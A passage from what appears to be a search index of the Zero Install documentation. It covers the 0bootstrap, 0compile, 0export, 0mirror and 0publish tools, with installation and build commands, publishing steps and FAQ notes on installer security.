it in the usual way: $ 0install add 0bootstrap http://0install.net/tools/0bootstrap.xml Before the program is released, you need to run it from the source repository: $ git clone git://zero-install.git.sourceforge.net/gitroot/zero-install/bootstrap $ cd bootstrap $ 0launch --feed 0bootstrap.xml $ 0install add 0bootstrap 0bootstrap.xml Creating a package for your program Run 0bootstrap, passing in the package format and the name (URI) of the main program. For example, to create an Ubuntu package for Edit: $ 0bootstrap --format=deb http://rox.sourceforge.net/2005/interfaces/Edit The resulting edit.deb package can now be installed on a Ubuntu machine. FAQ What about security? Installing a package isn't a great way to make a shortcut. The normal Zero Install process of dragging a feed link to a trusted installation program is much better. However, distributions have been very slow to support this. 0bootstrap is an attempt to boot-strap the adoption process. The native package is required to work with the operating system's package installation tools, and can be automatically created by a web service given the feed's URI.","title":"0bootstrap"},{"location":"tools/0bootstrap/#using-a-0bootstrap-package","text":"Open the file with your file manager, or run gdebi-gtk edit.deb in a terminal: The package will require Zero Install in order to install, as seen in the Details view: Installing native packages requires authentication. The installation will add the program to your menus.","title":"Using a 0bootstrap package"},{"location":"tools/0bootstrap/#current-status","text":"This program is not yet released.","title":"Current status"},{"location":"tools/0bootstrap/#installing-0bootstrap","text":"You can download 0bootstrap and create a short-cut to it in the usual way: $ 0install add 0bootstrap http://0install.net/tools/0bootstrap.xml Before the program is released, you need to run it from the source repository: $ git clone git://zero-install.git.sourceforge.net/gitroot/zero-install/bootstrap $ cd bootstrap $ 0launch --feed 0bootstrap.xml $ 0install add 0bootstrap 0bootstrap.xml","title":"Installing 0bootstrap"},{"location":"tools/0bootstrap/#creating-a-package-for-your-program","text":"Run 0bootstrap, passing in the package format and the name (URI) of the main program. For example, to create an Ubuntu package for Edit: $ 0bootstrap --format=deb http://rox.sourceforge.net/2005/interfaces/Edit The resulting edit.deb package can now be installed on a Ubuntu machine.","title":"Creating a package for your program"},{"location":"tools/0bootstrap/#faq","text":"What about security? Installing a package isn't a great way to make a shortcut. The normal Zero Install process of dragging a feed link to a trusted installation program is much better. However, distributions have been very slow to support this. 0bootstrap is an attempt to boot-strap the adoption process. The native package is required to work with the operating system's package installation tools, and can be automatically created by a web service given the feed's URI.","title":"FAQ"},{"location":"tools/0compile/","text":"Name: 0compile Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: Git repository Zero Install feed: http://0install.net/2006/interfaces/0compile.xml Normally, Zero Install will select a pre-built binary for your system. However, it can also be used to compile a new binary from a source package. This is useful if: no binary is available for your platform; you wish to build using different library versions; or you wish to make changes to a program or library. This tutorial shows how to use 0compile for these purposes. It is assumed that you have already installed Zero Install and know how to run programs using it. To get 0compile itself, use: $ 0install add 0compile http://0install.net/2006/interfaces/0compile.xml Note: this page describes the command-line interface to 0compile . There is also a graphical interface, which is used when you click on the Compile button in the injector. The graphical interface provides similar options, but is slightly more limited. Here are some screenshots . Contents: Autocompile Manual compilation Creating the build environment Building Modifying the source Publishing the binary Bundling dependencies Legacy helper features Recreating a build environment Making source available Building in a clean chroot Autocompile If you just want to compile some existing source code (without changing it), then the autocompile sub-command does the job. Given the URI of a program, it will download and compile the source in a temporary directory, add the resulting binary to the Zero Install cache, and register the new binary with 0launch . If the source depends on other programs, it will also download and compile them in the same way if no binary is currently available for the preferred version. For example (GNU-Hello is a simple test program which depends only on make ): $ 0compile autocompile http://0install.net/tests/GNU-Hello.xml ================= http://0install.net/tests/GNU-Hello.xml ================== Selecting versions for GNU Hello... Selection done. Plan: - GNU Hello: Compile 1.3 (sha1=2aae32fd27d194167eac7eb611d7ce0983f83dd7) - make: Use existing binary 3.81-5 (Linux-x86_64) No dependencies need compiling... compile GNU Hello itself... Waiting for selected implementations to be downloaded... ... Note that GNU-Hello does not get the C-compiler through Zero Install, so you will need that already (hint: apt-get install build-essential ). Once compiled, you can run it like this: $ 0launch http://0install.net/tests/GNU-Hello.xml Hello, world! You can also use autocompile --gui for a graphical version. This makes it easier to see the overall progress, because the verbose build output is shown separately in the lower pane: Manual compilation If you want to modify the source before building, keep the object files around for rebuilding, or choose the versions used, you'll want to use the manual commands, described in the following sections. Creating the build environment To get started, run 0compile setup with the URL of the program you want to build. In this example, we'll use GNU-Hello , a simple program written by the FSF to demonstrate use of the popular GNU build tools: $ 0compile setup http://0install.net/tests/GNU-Hello.xml GNU-Hello Created directory GNU-Hello 0compile will run 0install select --source to select a suitable version of the source code and download it. It will also locate and download any dependencies (e.g. build tools or header files) the source may have. It will download the make utility in this case, or use your distribution's package. The final argument names a directory for the build environment. If omitted, it defaults to the last component of the URI, without the .xml extension (so we could have just left it off in this case). 0compile will create this directory in the current directory. All further 0compile commands are run from inside this new directory, which is currently empty except for a 0compile.properties file recording the URI of the program. If you want to change the selected version(s) later, do: $ cd GNU-Hello $ 0compile setup Building To compile the program, use the build command (from inside the GNU-Hello directory): $ 0compile build TMPDIR=/tmp/0compile-T5GJBj BUILDDIR=/home/me/GNU-Hello/build DISTDIR=/home/me/GNU-Hello/gnu-hello-linux-x86_64-1.3 SRCDIR=/home/me/.cache/0install.net/implementations/... cd /tmp/GNU-Hello/build Executing: \"$SRCDIR/configure\" --prefix=\"$DISTDIR\" && make install ... Note: GNU-Hello does not use Zero Install to get the C compiler ( gcc ) or the standard library header files ( libc-dev ), so you should install these yourself. They come with most distributions. 0compile starts by creating two sub-directories: gnu-hello-linux-x86_64 for the final result (the exact name will depend on your system) and build for any temporary files. It then executes a command specified in the source feed, which actually builds the software (using the standard GNU build system in this case). Note that the command installs to the gnu-hello-linux-x86_64 directory rather than to the usual /usr/local . Assuming the build is successful, gnu-hello-linux-x86_64 will contain the final result, including a handy gnu-hello-linux-x86_64/0install/feed.xml local feed file, which you can use to run the new binary (note: this used to be gnu-hello-linux-x86_64/0install/GNU-Hello.xml on older versions of 0compile): $ 0launch gnu-hello-linux-x86_64/0install/feed.xml Hello, world! In fact, since GNU-Hello doesn't list any run-time dependencies, we could have just run the gnu-hello-linux-x86_64/bin/hello binary directly in this case. For more complex programs, the feed file will be useful. You can also pass it to 0install add-feed to register the new binary under the program's normal URI: $ 0launch -c http://0install.net/tests/GNU-Hello.xml Interface 'http://0install.net/tests/GNU-Hello.xml' has no usable implementations $ 0install add-feed gnu-hello-linux-x86_64/0install/feed.xml 1) Add as feed for 'http://0install.net/tests/GNU-Hello.xml' $ 0launch -c http://0install.net/tests/GNU-Hello.xml Hello, world! If everything worked, you can now delete the build directory to save space. However, if you're planning to modify the source and rebuild (described in the next section) then you'll want to leave it there, as it will make rebuilding faster. For future reference, there is also a gnu-hello-linux-x86_64/0install/build-environment.xml file. This is a selections file, as produced by 0install select --source --xml , but with a few extra details of the build added, including the hostname of the machine used for the build, a timestamp and your username. You can use this to rebuild later with the same environment (e.g. using this exact version of make ). The file is written before the build starts, so the build process may add to it. Modifying the source By default, 0compile keeps the source code in the (read-only) Zero Install cache, so if you want to make changes, the first step is to make a copy of it: $ 0compile copy-src Copied as '/home/me/GNU-Hello/src' Edit the source as needed with the text editor of your choice. For example, we can change the message (here we're using ed, the standard text editor ): $ ed src/hello.c 5207 %s/Hello, world!/Goodbye, world!/ wq 5209 Recompile with `0compile build` as before: ```shell $ 0compile build $ 0launch gnu-hello-linux-x86_64/0install/feed.xml Goodbye, world! If you compare the new gnu-hello-linux-x86_64/0install directory with the old one, you'll discover a couple of differences: A new file is present, gnu-hello-linux-x86_64/0install/from-1.3.patch , containing a diff between the original sources and your modified ones (to display this without rebuilding, use 0compile diff ). The version number in the local feed has -1 appended, to indicate that this version has been modified. These two features make it very easy to keep track of what you changed, which may well come in handy later! However, if you are making larger changes to the code then you will want to use a proper version control system (such as Git ). Publishing the binary To share our new binary with other people, we just need to archive up the gnu-hello-linux-x86_64 directory and upload it to an FTP or HTTP server somewhere. Pass the URL of the remote directory to 0compile and upload the resulting binary (note: the version will be 1.3-1 if you modified the source): $ 0compile publish http://mysite/downloads Now upload 'gnu-hello-linux-x86_64-1.3.tar.bz2' as: http://mysite/downloads/gnu-hello-linux-x86_64-1.3.tar.bz2 $ scp gnu-hello-linux-x86_64-1.3.tar.bz2 mysite:/var/www/downloads/ As well as the .tar.bz2 file, you will also get a GNU-Hello-1.3.xml file in the main GNU-Hello directory. You can use this new XML file to download the archive and run the program: $ 0launch GNU-Hello-1.3.xml You can either ask the maintainer of the program to add the implementation in this file to the master feed, or you can create your own feed (and ask them to add that). See the 0publish page for full details, but as a quick summary you can create a new signed feed like this: $ 0publish .../GNU-Hello.xml \\ --xmlsign \\ --set-interface-uri=http://mysite/interfaces/GNU-Hello.xml \\ --local=GNU-Hello-1.3.xml Then upload the signed .../GNU-Hello.xml file and the exported GPG key to your webserver. Bundling dependencies You might want to build on a machine without network access, or to archive everything needed to build a particular program. To do that, use this command: $ 0compile include-deps The source code and all dependencies will be copied into a new dependencies sub-directory. When building, this directory is added to the implementation cache search path (using 0launch --with-store ). Legacy helper features 0compile has some special code to detect and handle some common cases in legacy code: Generated pkgconfig files with absolute paths If $DISTDIR ends up containing a directory called pkgconfig , it checks each .pc file inside for an absolute prefix. If found, it is changed to a relative path. Note: for \"pure\" Zero Install libraries, just use a relative path (e.g. prefix=${pcfiledir}/.. ) in the .pc file in the source, and copy it unchanged to $DISTDIR . Build dependencies containing /usr/lib/lib*.so broken symlinks RPM unpacks all packages over the root, so one package can have a symlink to a file provided by a different package. This is often used to set the default version of a library in RPM packages. e.g. -devel package: libSDL.so -> libSDL-1.2.so.0.11.2 (broken link) runtime package: provides libSDL-1.2.so.0.11.2 Since Zero Install keeps every package in its own directory, this doesn't work. Therefore, 0compile searches for such broken links, searches for a matching target, and creates a fixed link in a temporary directory, added to LD_LIBRARY_PATH . This makes it easy to depend on unmodified -devel packages which were designed for non-Zero Install systems. Note: a \"pure\" Zero Install library wouldn't need to include the version number in the library filename, so no symlink would be needed. If you did want to include the number in the filename, the symlink to it would go in the runtime package, not the -dev el package. Build dependencies with lib64 directories If the feed tries to add a directory under lib or usr/lib to $PKG_CONFIG_PATH , and the directory doesn't exist, 0compile uses the corresponding lib64 directory instead, if present. This is for existing RPMs which use a different directory structure for different architectures. Libtool archive (.la) files 0compile searches for lib/*.la files in $DISTDIR and automatically deletes them for you (there is a safely check that it really is a libtool file first). These files were only needed on very old systems that don't support dynamic linking. These days they just cause trouble by using absolute paths which were only valid during the build. Recreating a build environment If you want to rebuild a binary package, see if it includes the 0install/build-environment.xml file that 0compile generates automatically. If so, you can re-create the build like this: $ 0compile setup .../someprog-binary/0install/build-environment.xml some-prog $ cd some-prog $ 0compile build For example, in the GNU-Hello case this would allow you to build using the same source code and the exact same version of make used in the original compile. Making source available If you want to publish source code so that other people can compile it using 0compile, see 0compile: Developers . Building in a clean chroot If you want to build the source package in a clean chroot sandbox environment, see 0compile: Chroot Build .","title":"0compile"},{"location":"tools/0compile/#autocompile","text":"If you just want to compile some existing source code (without changing it), then the autocompile sub-command does the job. Given the URI of a program, it will download and compile the source in a temporary directory, add the resulting binary to the Zero Install cache, and register the new binary with 0launch . If the source depends on other programs, it will also download and compile them in the same way if no binary is currently available for the preferred version. For example (GNU-Hello is a simple test program which depends only on make ): $ 0compile autocompile http://0install.net/tests/GNU-Hello.xml ================= http://0install.net/tests/GNU-Hello.xml ================== Selecting versions for GNU Hello... Selection done. Plan: - GNU Hello: Compile 1.3 (sha1=2aae32fd27d194167eac7eb611d7ce0983f83dd7) - make: Use existing binary 3.81-5 (Linux-x86_64) No dependencies need compiling... compile GNU Hello itself... Waiting for selected implementations to be downloaded... ... Note that GNU-Hello does not get the C-compiler through Zero Install, so you will need that already (hint: apt-get install build-essential ). Once compiled, you can run it like this: $ 0launch http://0install.net/tests/GNU-Hello.xml Hello, world! You can also use autocompile --gui for a graphical version. This makes it easier to see the overall progress, because the verbose build output is shown separately in the lower pane:","title":"Autocompile"},{"location":"tools/0compile/#manual-compilation","text":"If you want to modify the source before building, keep the object files around for rebuilding, or choose the versions used, you'll want to use the manual commands, described in the following sections.","title":"Manual compilation"},{"location":"tools/0compile/#creating-the-build-environment","text":"To get started, run 0compile setup with the URL of the program you want to build. In this example, we'll use GNU-Hello , a simple program written by the FSF to demonstrate use of the popular GNU build tools: $ 0compile setup http://0install.net/tests/GNU-Hello.xml GNU-Hello Created directory GNU-Hello 0compile will run 0install select --source to select a suitable version of the source code and download it. It will also locate and download any dependencies (e.g. build tools or header files) the source may have. It will download the make utility in this case, or use your distribution's package. The final argument names a directory for the build environment. If omitted, it defaults to the last component of the URI, without the .xml extension (so we could have just left it off in this case). 0compile will create this directory in the current directory. All further 0compile commands are run from inside this new directory, which is currently empty except for a 0compile.properties file recording the URI of the program. If you want to change the selected version(s) later, do: $ cd GNU-Hello $ 0compile setup","title":"Creating the build environment"},{"location":"tools/0compile/#building","text":"To compile the program, use the build command (from inside the GNU-Hello directory): $ 0compile build TMPDIR=/tmp/0compile-T5GJBj BUILDDIR=/home/me/GNU-Hello/build DISTDIR=/home/me/GNU-Hello/gnu-hello-linux-x86_64-1.3 SRCDIR=/home/me/.cache/0install.net/implementations/... cd /tmp/GNU-Hello/build Executing: \"$SRCDIR/configure\" --prefix=\"$DISTDIR\" && make install ... Note: GNU-Hello does not use Zero Install to get the C compiler ( gcc ) or the standard library header files ( libc-dev ), so you should install these yourself. They come with most distributions. 0compile starts by creating two sub-directories: gnu-hello-linux-x86_64 for the final result (the exact name will depend on your system) and build for any temporary files. It then executes a command specified in the source feed, which actually builds the software (using the standard GNU build system in this case). Note that the command installs to the gnu-hello-linux-x86_64 directory rather than to the usual /usr/local . Assuming the build is successful, gnu-hello-linux-x86_64 will contain the final result, including a handy gnu-hello-linux-x86_64/0install/feed.xml local feed file, which you can use to run the new binary (note: this used to be gnu-hello-linux-x86_64/0install/GNU-Hello.xml on older versions of 0compile): $ 0launch gnu-hello-linux-x86_64/0install/feed.xml Hello, world! In fact, since GNU-Hello doesn't list any run-time dependencies, we could have just run the gnu-hello-linux-x86_64/bin/hello binary directly in this case. For more complex programs, the feed file will be useful. You can also pass it to 0install add-feed to register the new binary under the program's normal URI: $ 0launch -c http://0install.net/tests/GNU-Hello.xml Interface 'http://0install.net/tests/GNU-Hello.xml' has no usable implementations $ 0install add-feed gnu-hello-linux-x86_64/0install/feed.xml 1) Add as feed for 'http://0install.net/tests/GNU-Hello.xml' $ 0launch -c http://0install.net/tests/GNU-Hello.xml Hello, world! If everything worked, you can now delete the build directory to save space. However, if you're planning to modify the source and rebuild (described in the next section) then you'll want to leave it there, as it will make rebuilding faster. For future reference, there is also a gnu-hello-linux-x86_64/0install/build-environment.xml file. This is a selections file, as produced by 0install select --source --xml , but with a few extra details of the build added, including the hostname of the machine used for the build, a timestamp and your username. You can use this to rebuild later with the same environment (e.g. using this exact version of make ). The file is written before the build starts, so the build process may add to it.","title":"Building"},{"location":"tools/0compile/#modifying-the-source","text":"By default, 0compile keeps the source code in the (read-only) Zero Install cache, so if you want to make changes, the first step is to make a copy of it: $ 0compile copy-src Copied as '/home/me/GNU-Hello/src' Edit the source as needed with the text editor of your choice. For example, we can change the message (here we're using ed, the standard text editor ): $ ed src/hello.c 5207 %s/Hello, world!/Goodbye, world!/ wq 5209 Recompile with `0compile build` as before: ```shell $ 0compile build $ 0launch gnu-hello-linux-x86_64/0install/feed.xml Goodbye, world! If you compare the new gnu-hello-linux-x86_64/0install directory with the old one, you'll discover a couple of differences: A new file is present, gnu-hello-linux-x86_64/0install/from-1.3.patch , containing a diff between the original sources and your modified ones (to display this without rebuilding, use 0compile diff ). The version number in the local feed has -1 appended, to indicate that this version has been modified. These two features make it very easy to keep track of what you changed, which may well come in handy later! However, if you are making larger changes to the code then you will want to use a proper version control system (such as Git ).","title":"Modifying the source"},{"location":"tools/0compile/#publishing-the-binary","text":"To share our new binary with other people, we just need to archive up the gnu-hello-linux-x86_64 directory and upload it to an FTP or HTTP server somewhere. Pass the URL of the remote directory to 0compile and upload the resulting binary (note: the version will be 1.3-1 if you modified the source): $ 0compile publish http://mysite/downloads Now upload 'gnu-hello-linux-x86_64-1.3.tar.bz2' as: http://mysite/downloads/gnu-hello-linux-x86_64-1.3.tar.bz2 $ scp gnu-hello-linux-x86_64-1.3.tar.bz2 mysite:/var/www/downloads/ As well as the .tar.bz2 file, you will also get a GNU-Hello-1.3.xml file in the main GNU-Hello directory. You can use this new XML file to download the archive and run the program: $ 0launch GNU-Hello-1.3.xml You can either ask the maintainer of the program to add the implementation in this file to the master feed, or you can create your own feed (and ask them to add that). See the 0publish page for full details, but as a quick summary you can create a new signed feed like this: $ 0publish .../GNU-Hello.xml \\ --xmlsign \\ --set-interface-uri=http://mysite/interfaces/GNU-Hello.xml \\ --local=GNU-Hello-1.3.xml Then upload the signed .../GNU-Hello.xml file and the exported GPG key to your webserver.","title":"Publishing the binary"},{"location":"tools/0compile/#bundling-dependencies","text":"You might want to build on a machine without network access, or to archive everything needed to build a particular program. To do that, use this command: $ 0compile include-deps The source code and all dependencies will be copied into a new dependencies sub-directory. When building, this directory is added to the implementation cache search path (using 0launch --with-store ).","title":"Bundling dependencies"},{"location":"tools/0compile/#legacy-helper-features","text":"0compile has some special code to detect and handle some common cases in legacy code: Generated pkgconfig files with absolute paths If $DISTDIR ends up containing a directory called pkgconfig , it checks each .pc file inside for an absolute prefix. If found, it is changed to a relative path. Note: for \"pure\" Zero Install libraries, just use a relative path (e.g. prefix=${pcfiledir}/.. ) in the .pc file in the source, and copy it unchanged to $DISTDIR . Build dependencies containing /usr/lib/lib*.so broken symlinks RPM unpacks all packages over the root, so one package can have a symlink to a file provided by a different package. This is often used to set the default version of a library in RPM packages. e.g. -devel package: libSDL.so -> libSDL-1.2.so.0.11.2 (broken link) runtime package: provides libSDL-1.2.so.0.11.2 Since Zero Install keeps every package in its own directory, this doesn't work. Therefore, 0compile searches for such broken links, searches for a matching target, and creates a fixed link in a temporary directory, added to LD_LIBRARY_PATH . This makes it easy to depend on unmodified -devel packages which were designed for non-Zero Install systems. Note: a \"pure\" Zero Install library wouldn't need to include the version number in the library filename, so no symlink would be needed. If you did want to include the number in the filename, the symlink to it would go in the runtime package, not the -dev el package. Build dependencies with lib64 directories If the feed tries to add a directory under lib or usr/lib to $PKG_CONFIG_PATH , and the directory doesn't exist, 0compile uses the corresponding lib64 directory instead, if present. This is for existing RPMs which use a different directory structure for different architectures. Libtool archive (.la) files 0compile searches for lib/*.la files in $DISTDIR and automatically deletes them for you (there is a safely check that it really is a libtool file first). These files were only needed on very old systems that don't support dynamic linking. These days they just cause trouble by using absolute paths which were only valid during the build.","title":"Legacy helper features"},{"location":"tools/0compile/#recreating-a-build-environment","text":"If you want to rebuild a binary package, see if it includes the 0install/build-environment.xml file that 0compile generates automatically. If so, you can re-create the build like this: $ 0compile setup .../someprog-binary/0install/build-environment.xml some-prog $ cd some-prog $ 0compile build For example, in the GNU-Hello case this would allow you to build using the same source code and the exact same version of make used in the original compile.","title":"Recreating a build environment"},{"location":"tools/0compile/#making-source-available","text":"If you want to publish source code so that other people can compile it using 0compile, see 0compile: Developers .","title":"Making source available"},{"location":"tools/0compile/#building-in-a-clean-chroot","text":"If you want to build the source package in a clean chroot sandbox environment, see 0compile: Chroot Build .","title":"Building in a clean chroot"},{"location":"tools/0export/","text":"Name: 0export Maintainer: Thomas Leonard License: GNU General Public License Source: Git repository Zero Install feed: http://0install.net/tools/0export.xml 0export creates self-installing bundles for distribution on CD, etc Normally, a program is run by passing its name (a URI) to the 0launch command. This downloads the appropriate feeds, chooses a set of implementations (a version of the program, along with any libraries it needs) and downloads them too. However, it is sometimes useful to bundle a program and its libraries together on a CD (for example) so that it can be used on machines without a network connection, or where the network is very slow. It is also useful for archival purposes, in case the original web-sites supplying required libraries become unavailable. 0export takes the URI of a program and creates a setup.sh file; a self-extracting archive containing everything needed to run the program. This file can be executed on a machine without a network connection to install or run the program. Programs installed using setup.sh are added to the 0install cache and are therefore still shared between users , and will get updates over the web where possible. 0export does not work on Windows. However Zero Install for Windows has roughly equivalent functionality built in. See Export for details. If the target machine has network access, and you just want to provide a launcher script, consider instead using 0bootstrap-php , a PHP script that creates bootstrapping EXEs or bash scripts for installing 0install and then running a feed. Contents: Using a 0export package Current status Installing 0export Creating a setup.sh for your program Format of the setup.sh Testing Support for multiple architectures or multiple applications in one bundle FAQ Using a 0export package Open the file with your file manager, or run sh setup.sh in a terminal: The archive will unpack and run: You can add the program to your menus or run it directly. Current status This program is not yet complete. In particular, adding the program to the user's menus only works if the user already has 0install itself installed. Installing 0export You can download 0export and create a short-cut to it in the usual way: $ 0install add 0export http://0install.net/tools/0export.xml Creating a setup.sh for your program Run 0export, passing in the name of the installer file to create and the name (URI) of the main program. For example, to create an installer for Edit: $ 0export setup.sh http://rox.sourceforge.net/2005/interfaces/Edit The resulting setup.sh file can be copied to a CD and run on another machine. This machine does not need a network connection. It also does not need to have 0install installed on it before-hand. However, if the machine does have a network connection then the user will be notified of updates in the usual way. Format of the setup.sh The bulk of the setup.sh file is an archive containing: All feeds needed to run the program. All GPG keys signing the feeds. All selected implementations (versions). A copy of 0install, in case the target system doesn't have it. An installation script. To make the archive self-extracting, a short shell script is prepended to the archive which unpacks it to a temporary directory and then runs the installer. If you want to extract the files without executing anything, you can get the information you need from the first four lines of the script, which look like this: #!/bin/sh # 0export 0.1 archive_offset=00831 archive_format=application/x-bzip-compressed-tar Testing To test the installer: $ sh setup.sh The script currently (0export 0.1) does the following: Runs gpg --import on each GPG key in the archive, adding the keys that signed the feeds to your key-ring. Runs 0launch --import on each feed in the archive. Every signing GPG key is added to the trusted list for the feed's domain. This allows checking for updates in future without confirming the keys. If the user already has a newer version of the feed, the import has no effect. Chooses a set of implementations ( 0install select --xml URI ) in minimal network use mode and with the implementations in the setup.sh available. Copies any selected implementations into the system or user's cache ( ~/.cache/0install.net/implementations ). Runs the program ( 0launch --offline URI ). All steps use the bundled version of 0launch. Support for multiple architectures or multiple applications in one bundle You can use the --arch option to set the target architecture(s). For example, this command will select two binaries for each component, one that will run on an i586 machine and one that will run on an x86_64 machine: $ 0export --arch Linux-i586 --arch Linux-x86_64 setup.sh http://... If a single binary is the best option for both then it will only be included in the bundle once. When the bundle is installed, only the required versions will be copied into the machine's cache. You can include multiple applications by listing multiple URIs. All applications will be added to the user's menu, but only the first will be run if the user selects the run option in the dialog. Note that dependencies are included automatically and should not be listed. FAQ What about security? Running an executable isn't a great way to install a program. The normal 0install process of dragging a feed link to a trusted installation program is much better. However, distributions have been very slow to support this. 0export is an attempt to boot-strap the adoption process. The setup.sh script is designed to be easy to parse, so that in future it can be used as a simple archive. Why doesn't it confirm before trusting the keys? If the setup.sh is genuine then this is what you want. If it isn't, it's already too late. Even if the normal install script asked for confirmation, a malicious version could be modified to skip the check. One of many reasons why install scripts are a bad idea.","title":"0export"},{"location":"tools/0export/#using-a-0export-package","text":"Open the file with your file manager, or run sh setup.sh in a terminal: The archive will unpack and run: You can add the program to your menus or run it directly.","title":"Using a 0export package"},{"location":"tools/0export/#current-status","text":"This program is not yet complete. In particular, adding the program to the user's menus only works if the user already has 0install itself installed.","title":"Current status"},{"location":"tools/0export/#installing-0export","text":"You can download 0export and create a short-cut to it in the usual way: $ 0install add 0export http://0install.net/tools/0export.xml","title":"Installing 0export"},{"location":"tools/0export/#creating-a-setupsh-for-your-program","text":"Run 0export, passing in the name of the installer file to create and the name (URI) of the main program. For example, to create an installer for Edit: $ 0export setup.sh http://rox.sourceforge.net/2005/interfaces/Edit The resulting setup.sh file can be copied to a CD and run on another machine. This machine does not need a network connection. It also does not need to have 0install installed on it before-hand. However, if the machine does have a network connection then the user will be notified of updates in the usual way.","title":"Creating a setup.sh for your program"},{"location":"tools/0export/#format-of-the-setupsh","text":"The bulk of the setup.sh file is an archive containing: All feeds needed to run the program. All GPG keys signing the feeds. All selected implementations (versions). A copy of 0install, in case the target system doesn't have it. An installation script. To make the archive self-extracting, a short shell script is prepended to the archive which unpacks it to a temporary directory and then runs the installer. If you want to extract the files without executing anything, you can get the information you need from the first four lines of the script, which look like this: #!/bin/sh # 0export 0.1 archive_offset=00831 archive_format=application/x-bzip-compressed-tar","title":"Format of the setup.sh"},{"location":"tools/0export/#testing","text":"To test the installer: $ sh setup.sh The script currently (0export 0.1) does the following: Runs gpg --import on each GPG key in the archive, adding the keys that signed the feeds to your key-ring. Runs 0launch --import on each feed in the archive. Every signing GPG key is added to the trusted list for the feed's domain. This allows checking for updates in future without confirming the keys. If the user already has a newer version of the feed, the import has no effect. Chooses a set of implementations ( 0install select --xml URI ) in minimal network use mode and with the implementations in the setup.sh available. Copies any selected implementations into the system or user's cache ( ~/.cache/0install.net/implementations ). Runs the program ( 0launch --offline URI ). All steps use the bundled version of 0launch.","title":"Testing"},{"location":"tools/0export/#support-for-multiple-architectures-or-multiple-applications-in-one-bundle","text":"You can use the --arch option to set the target architecture(s). For example, this command will select two binaries for each component, one that will run on an i586 machine and one that will run on an x86_64 machine: $ 0export --arch Linux-i586 --arch Linux-x86_64 setup.sh http://... If a single binary is the best option for both then it will only be included in the bundle once. When the bundle is installed, only the required versions will be copied into the machine's cache. You can include multiple applications by listing multiple URIs. All applications will be added to the user's menu, but only the first will be run if the user selects the run option in the dialog. Note that dependencies are included automatically and should not be listed.","title":"Support for multiple architectures or multiple applications in one bundle"},{"location":"tools/0export/#faq","text":"What about security? Running an executable isn't a great way to install a program. The normal 0install process of dragging a feed link to a trusted installation program is much better. However, distributions have been very slow to support this. 0export is an attempt to boot-strap the adoption process. The setup.sh script is designed to be easy to parse, so that in future it can be used as a simple archive. Why doesn't it confirm before trusting the keys? If the setup.sh is genuine then this is what you want. If it isn't, it's already too late. Even if the normal install script asked for confirmation, a malicious version could be modified to skip the check. One of many reasons why install scripts are a bad idea.","title":"FAQ"},{"location":"tools/0mirror/","text":"Name: 0mirror Maintainer: Thomas Leonard License: GNU General Public License Source: Git repository With Zero Install, each software author publishes a feed on their web-site giving details about their software. Users can use these feeds to download the software and to receive notification of new versions. However, the author's site may become unavailable, either temporarily (e.g. due to network problems) or permanently (e.g. if the software is abandoned). Therefore, mirror sites are used to keep an up-to-date copy of the original feeds. Mirror sites can be public (such as the roscidus.com mirror ), or internal to your organisation. 0mirror takes a list of feed URLs and exports each one from your local Zero Install cache ready for publishing on a web-server (such as Apache). The published site contains: All known versions of the feed XML, with a symlink pointing to the most recent. All GPG keys used to sign the feeds. An Atom feed with news about the most recent changes. Note that it does not export the actual programs themselves, although that would certainly be useful for sites with plenty of bandwidth (which we don't have currently; sorry!). Status 0mirror is not yet officially released, although the GIT version works well enough to create the roscidus.com mirror. 0launch 0.33 has built-in support for using the mirror service. On older versions, the GPG keys and feeds can be added manually (e.g. using 0launch --import feed.xml ).","title":"0mirror"},{"location":"tools/0mirror/#status","text":"0mirror is not yet officially released, although the GIT version works well enough to create the roscidus.com mirror. 0launch 0.33 has built-in support for using the mirror service. On older versions, the GPG keys and feeds can be added manually (e.g. using 0launch --import feed.xml ).","title":"Status"},{"location":"tools/0publish-win/","text":"Name: 0publish-win / Zero Install Publishing Tools Maintainer: Bastian Eicher License: GNU Lesser General Public License Source: Git repository Zero Install feed: http://0install.de/feeds/ZeroInstall_Tools.xml The Zero Install Publishing Tools allow you to create your own feeds on Windows. You need Zero Install to run the Publishing Tools. You can either search for \"Zero Install Publishing Tools\" in the Catalog or type this on the command-line: $ http://0install.de/feeds/ZeroInstall_Tools.xml The Zero Install Publishing Tools consist of the following components: Feed Editor Screenshots New Feed Wizard Feed Editor split with screen graphical and XML view changes in the graphical view are reflected in the XML view immediately and vice-versa syntax-highlighting and error-underlining in the XML view Screenshots New Feed Wizard walks you through the entire feed creation process detects entry points (executables) in archives automatically creates appropriate <runner> s for Java, .NET and Python executables extracts metadata (name, version number, etc.) where possible","title":"0publish-win"},{"location":"tools/0publish-win/#feed-editor","text":"split with screen graphical and XML view changes in the graphical view are reflected in the XML view immediately and vice-versa syntax-highlighting and error-underlining in the XML view","title":"Feed Editor"},{"location":"tools/0publish-win/#screenshots","text":"","title":"Screenshots"},{"location":"tools/0publish-win/#new-feed-wizard","text":"walks you through the entire feed creation process detects entry points (executables) in archives automatically creates appropriate <runner> s for Java, .NET and Python executables extracts metadata (name, version number, etc.) where possible","title":"New Feed Wizard"},{"location":"tools/0publish/","text":"Name: 0publish Maintainer: Thomas Leonard License: GNU Lesser General Public License Source: Git repository Zero Install feed: http://0install.net/2006/interfaces/0publish Making a new release of your software can be time consuming and error-prone, so you'll probably want to script as much as possible of it. The 0publish command provides a set of useful transformations for feed files which you can integrate into your release scripts. However, 0publish is somewhat deprecated : If you're looking for a graphical environment instead, see 0publish-gui in the packaging guide . To add a new version of a program to a feed, consider using 0template to generate the XML for the new version and 0repo to add it to the master feed. 0release provides a more complete solution for managing releases (0release uses 0publish or 0repo internally, but also handles many other aspects of making releases for you). Contents: General operation 0publish reference Options FAQ gpg: signing failed: secret key not available General operation 0publish edits feed files in place. It loads the file, transforms it in some way (such as setting the release date, or adding a new implementation) and then writes it back out again. If the input file was signed, it will resign it when saving with the same key by default. You can also use it to add a signature, or to change the signing key. You can create an app for 0publish in the usual way: $ 0install add 0publish http://0install.net/2006/interfaces/0publish The SCons packaging tutorial shows many examples of using 0publish . 0publish reference Usage: 0publish [options] feed.xml Options -h , --help Show help message and exit. -a FEED , --add-from=FEED Add the implementation(s) in FEED to this one, putting them in the most sensible <group> (so as to minimise duplication of requirements, etc). --add-types add missing MIME-type attributes. --add-version=VERSION Add a new implementation (use with --archive-url , etc). --archive-url=URL , --archive-file=FILE , --archive-extract=DIR Change a local implementation to one with a digest and an archive. See the SCons tutorial for an example. -c , --create Create a new feed file (if non-existent) without prompting. -d ALG , --add-digest=ALG Add extra digests using the given algorithm. -e , --edit Edit with $EDITOR . This is useful if the file is signed, since it removes 